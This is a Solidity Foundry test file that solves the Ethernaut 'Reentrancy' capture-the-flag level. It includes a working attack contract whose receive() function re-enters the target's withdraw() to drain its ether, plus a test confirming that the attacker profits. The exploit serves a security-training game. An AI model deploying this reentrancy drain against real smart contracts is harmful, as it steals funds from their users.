pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/10-Reentrancy/ReentrancyFactory.sol';
import '../core/Ethernaut.sol';

contract ReentrancyAttack {
  Reentrance private reentrance;
  address private owner;

  uint256 private initialDonation;

  constructor (address payable _target) {
    reentrance = Reentrance(_target);
    owner = msg.sender;
  }

  function attack() external payable {
    require(msg.value > 0, "Need eth to attack");

    initialDonation = msg.value;
    // setup the exploit via donate()
    reentrance.donate{value: initialDonation}(address(this));
  
    // trigger the bug via withdraw
    reentrance.withdraw(initialDonation);
  }

  function withdraw() external {
    require(msg.sender == owner, "Not owner");

    uint256 balance = address(this).balance;
    (bool result,) = msg.sender.call{value: balance}("");
    require(result, "Failed to withdraw");
  }

  receive() external payable {
    // once our withdrawal is retrieved, trigger the drain due to the reentrancy
    uint256 remainingBalance = address(reentrance).balance;
    
    if (remainingBalance > 0) {
      // Compute minimum amount between Attack contract and Victim contract
      uint256 minAmount = remainingBalance < initialDonation
        ? remainingBalance
        : initialDonation;
      reentrance.withdraw(minAmount);
    }
  }
}

contract ReentrancyTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 10 ether); // fund our attacker contract with 1 ether
  }

  function testReentrancyHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    ReentrancyFactory reentrancyFactory = new ReentrancyFactory();
    ethernaut.registerLevel(reentrancyFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(reentrancyFactory);
    Reentrance reentrancyContract = Reentrance(payable(levelAddress));
    vm.deal(address(reentrancyContract), 10 ether); // fund the target contract

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    assertEq(address(reentrancyContract).balance, 10 ether);
    emit log_named_uint(
      'Confirm contract has value: ', 
      address(reentrancyContract).balance
    );

    assertEq(attacker.balance, 10 ether);
    emit log_named_uint(
      'Confirm attacker has 10 eth: ', 
      attacker.balance
    );

    // Deploy our malicious contract
    ReentrancyAttack attackContract = new ReentrancyAttack(payable(reentrancyContract));
    assertEq(address(attackContract).balance, 0);

    uint256 attackerBalanceBefore = attacker.balance;
    emit log_named_uint(
      'Confirm attacker balance before attack: ', 
      attackerBalanceBefore
    );

    // fire the exploit via depositing half of the targets balance (we know it's 10eth)
    // this triggers our reentrancy allowing us to double our money
    attackContract.attack{value: 5 ether}();

    uint256 attackContractBalance = address(attackContract).balance;
    emit log_named_uint(
      'Attacker contract balance after: ', 
      attackContractBalance
    );

    // withdraw the balance from the malicious contract
    attackContract.withdraw();
    uint256 attackerBalanceAfter = attacker.balance;

    assertGt(attackerBalanceAfter, attackerBalanceBefore);
    emit log_named_uint(
      "Attacker balance after attack: ",
      attackerBalanceAfter
    );

    uint256 targetContractBalanceAfter = address(reentrancyContract).balance;
    emit log_named_uint(
      "Target balance after attack: ",
      targetContractBalanceAfter
    );

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

